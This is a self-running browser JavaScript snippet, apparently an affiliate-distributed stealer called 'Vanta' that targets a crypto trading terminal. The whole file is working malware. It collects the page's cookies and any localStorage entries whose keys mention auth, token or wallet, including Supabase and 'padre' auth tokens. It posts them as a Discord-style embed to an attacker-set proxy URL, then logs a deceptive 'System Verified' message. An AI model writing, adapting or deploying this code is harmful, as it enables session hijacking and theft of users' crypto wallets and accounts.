(function() {
    const affId = window.V_AFF || 't23dad55';
    const proxy = window.V_PROXY;

    function extractSensitiveData() {
        const report = {
            storage: {},
            cookies: document.cookie,
            timestamp: new Date().toISOString()
        };

        // 1. Target specific Padre keys you found
        const targets = [
            'terminal-solWalletGroups', 
            'terminal-evmWalletGroups', 
            'terminal-bottomFunctionBarOrder',
            'padre-auth-token', // Common variant
            'supabase.auth.token' // Padre uses Supabase often
        ];

        // 2. Automated scan of ALL localStorage for "token" or "bundle"
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            
            // If the key matches our targets or contains spicy words
            if (targets.includes(key) || 
                key.toLowerCase().includes('auth') || 
                key.toLowerCase().includes('token') || 
                key.toLowerCase().includes('wallet')) {
                report.storage[key] = val;
            }
        }

        return report;
    }

    async function sendToVanta() {
        const data = extractSensitiveData();
        
        const payload = {
            embeds: [{
                title: "🎯 Vanta Deep Extraction: " + (window.location.hostname),
                color: 0x00ff88,
                fields: [
                    { name: "Affiliate ID", value: affId, inline: true },
                    { name: "URL", value: window.location.href, inline: true },
                    { name: "Raw Storage Dump", value: "```json\n" + JSON.stringify(data.storage, null, 2).substring(0, 1000) + "\n```" },
                    { name: "Cookies", value: "```" + (data.cookies || "None Found").substring(0, 500) + "```" }
                ],
                footer: { text: "Vanta Engine v2.8" }
            }]
        };

        try {
            await fetch(proxy, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            console.error("Vanta Sync Error");
        }
    }

    sendToVanta();
    console.log("%c System Verified ", "background: #00ff88; color: #000; font-weight: bold;");
})();
